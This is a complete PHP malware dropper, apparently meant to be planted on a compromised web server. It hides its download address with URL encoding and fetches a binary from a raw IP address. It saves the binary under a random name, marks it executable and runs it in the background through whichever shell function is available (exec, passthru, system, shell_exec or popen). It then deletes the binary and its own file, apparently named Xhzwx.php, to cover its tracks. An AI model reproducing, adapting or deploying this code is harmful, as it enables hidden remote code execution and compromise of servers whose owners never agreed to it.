<?php
$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$feilgame = '';
for ($i = 0; $i < 5; $i++) {
	$feilgame .= $characters[rand(0, $charactersLength - 1)];
	if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
		$feilgame .= '.exe';
	}
}
$patf = dirname(__FILE__);
file_put_contents($patf.'/'.$feilgame, "");
chmod($patf.'/', 0755);
$foc = @fopen($patf.'/'.$feilgame, 'a');
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $file = file_get_contents(urldecode('%68%74%74%70%3A%2F%2F%38%33%2E%32%31%37%2E%31%31%2E%33%37%2F%6D%61%73%74%61%6E'));
} else {
	$file = file_get_contents(urldecode('%68%74%74%70%3A%2F%2F%38%33%2E%32%31%37%2E%31%31%2E%33%37%2F%6D%61%73%74%61%6E'));
}
@fwrite($foc, $file);
@fclose($foc);
@chmod($patf.'/'.$feilgame, 0755);
sleep(1);
$dat = potor($patf.'/'.$feilgame);
sleep(1);
unlink($patf.'/'.$feilgame);
unlink($patf.'/Xhzwx.php');
function potor($wins) {
	$linx = '';
	if (function_exists('exec')) {
		@exec($wins . " > /dev/null &",$linx);
		$linx = @join("\n",$linx);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($wins . " > /dev/null &");
		$linx = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($wins . " > /dev/null &");
		$linx = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$linx = shell_exec($wins . " > /dev/null &");
	} elseif (is_resource($fto = @popen($wins,"r"))) {
		$linx = "";
		while(!@feof($fto))
			$linx .= fread($fto,1024);
		pclose($fto);
	}
	return $linx;
}
?>